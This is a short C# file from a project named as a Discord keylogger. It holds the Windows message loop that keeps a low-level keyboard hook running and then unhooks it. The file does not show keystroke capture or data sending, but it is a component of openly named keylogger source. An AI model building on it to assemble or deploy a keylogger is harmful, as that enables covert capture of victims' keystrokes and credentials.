using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace THT_Discord_Keylogger
{
    class SystemMessageThread
    {
        private static MSG static_message;
        public static void run_message_loop()
        {
            while (DLLImports.GetMessage(out static_message, IntPtr.Zero, 0, 0) != -1)
            {
                DLLImports.TranslateMessage(ref static_message);
                DLLImports.DispatchMessage(ref static_message);
            }

            DLLImports.UnhookWindowsHookEx(KeyboardHook.keyboard_hook);
            Console.WriteLine("Message loop is done. Hooks are unhooked!");
        }
    }
}
